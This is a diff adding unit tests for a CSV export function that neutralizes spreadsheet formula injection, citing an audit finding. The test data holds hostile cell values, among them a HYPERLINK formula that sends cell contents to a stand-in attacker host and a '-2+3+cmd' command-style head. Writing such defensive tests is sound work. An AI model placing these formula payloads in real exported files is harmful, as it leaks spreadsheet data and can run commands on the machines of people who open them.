@@ -95,4 +95,24 @@ describe('imagesCsv', () => {
     expect(lines[0]).toContain('count_delta')
     expect(lines[1]).toContain('"a,b"')
   })
+
+  it('neutralizes formula heads in untrusted string cells (CSV injection, audit F-02)', () => {
+    // repo/tag/namespaces are k8s/scanner input — the server sanitize_cell discipline
+    const hostile = row({
+      image_repo: '=HYPERLINK("https://attacker/"&A1)',
+      tag: '+SUM(1,2)',
+      namespaces: ['-2+3+cmd', 'ok'],
+    })
+    const line = imagesCsv([hostile]).split('\n')[1]
+    expect(line).toContain(`"'=HYPERLINK(""https://attacker/""&A1)"`)
+    expect(line).toContain("'+SUM(1,2)")
+    expect(line).toContain("'-2+3+cmd ok")
+    expect(line).toMatch(/^"'=/) // the cell head is disarmed, value readable
+  })
+
+  it('negative numeric cells stay bare numbers (only strings can arm)', () => {
+    const line = imagesCsv([row({ count_delta: -15 })]).split('\n')[1]
+    expect(line).toContain(',-15,')
+    expect(line).not.toContain("'-15")
+  })
 })
